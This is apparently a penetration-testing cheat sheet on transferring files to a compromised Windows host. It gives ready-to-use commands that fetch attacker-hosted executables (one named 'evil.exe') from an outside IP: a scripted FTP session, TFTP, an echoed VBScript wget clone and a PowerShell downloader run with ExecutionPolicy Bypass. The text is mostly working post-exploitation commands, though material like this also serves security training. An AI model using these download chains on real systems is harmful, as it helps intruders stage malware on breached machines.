# Transferring files to windows

Transferring files to linux is usually pretty easy. We can use netcat, wget, curl, which most systems have as default. But windows does not have these tools.



## FTP

Most windows machines have a ftp-client included. But we can't use it interactively since that most  likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.

On the compromised machine we echo out the following commands into a file

```
echo open 192.168.1.101 21> ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
```

Then run this command to connect to the ftp

```
ftp –v -n -s:ftp.txt
```

Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.

## TFTP

A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactivly. Which means less risk of losing your shell.

Kali has a TFTP server build in.
You can server up some files with it like this

```
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```

Now you can put stuff in /srf/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. 

You can see it running like this

```
netstat -a -p UDP | grep udp
```

So now you can upload and download whatever from the windows-machine like this

```
tftp -i 192.160.1.101 GET wget.exe
```

## VBScript

Here is a good script to make a wget-clone in VB.

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

```

You then execute the script like this: 
**cscript wget.vbs http://192.168.10.5/evil.exe evil.exe** 

The script works great and I found it at the this guys gist: https://gist.github.com/sckalath/ec7af6a1786e3de6c309


## Powershell

This is how we can download a file using powershell. Remember since we only have a non-interactive shell we can not start powershell.exe, because our shell can't handle that. But it is okay we can still run scripts in powershell.

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Now we invoke it with this crazy syntax:
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
NoProfile -File wget.ps1
```